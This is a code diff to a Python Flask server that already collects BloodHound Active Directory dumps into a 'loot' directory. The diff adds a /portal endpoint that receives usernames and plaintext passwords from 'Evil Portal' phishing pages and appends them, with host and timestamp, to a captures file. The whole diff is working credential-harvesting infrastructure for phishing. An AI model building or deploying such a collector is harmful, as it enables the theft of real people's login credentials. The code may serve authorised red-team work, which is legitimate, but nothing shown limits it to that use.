@@ -4,6 +4,7 @@
 from flask import Flask, request, send_file
 from pathlib import Path
 import base64, binascii, json, os, re
+from datetime import datetime
 
 app = Flask(__name__)
 app.config["MAX_CONTENT_LENGTH"] = 50 * 1024 * 1024  # 50 MB upload cap
@@ -97,6 +98,37 @@ def upload_bloodhound():
     dest.parent.mkdir(parents=True, exist_ok=True)
     dest.write_text(data, encoding="utf-8")
     print(f"[+] BloodHound {bh_type} from {host} → {dest}")
+    return "OK"
+
+
+@app.route("/portal", methods=["POST"])
+def portal_capture():
+    """Receive credentials from Evil Portal phishing pages."""
+    data = request.get_json(silent=True) or request.form.to_dict()
+    username = data.get("username", "")
+    password = data.get("password", "")
+    portal   = _safe_name(data.get("portal",   "unknown"))
+    host     = _safe_name(data.get("host",      "unknown"))
+    if not username and not password:
+        return "missing credentials", 400
+    entry = {
+        "ts":       datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%SZ"),
+        "portal":   portal,
+        "host":     host,
+        "username": username,
+        "password": password,
+    }
+    dest = LOOT / "portals" / "captures.json"
+    dest.parent.mkdir(parents=True, exist_ok=True)
+    captures: list = []
+    if dest.exists():
+        try:
+            captures = json.loads(dest.read_text())
+        except (json.JSONDecodeError, OSError):
+            captures = []
+    captures.append(entry)
+    dest.write_text(json.dumps(captures, indent=2))
+    print(f"[+] Portal capture: {portal} / {username} from {host}")
     return "OK"
 
 
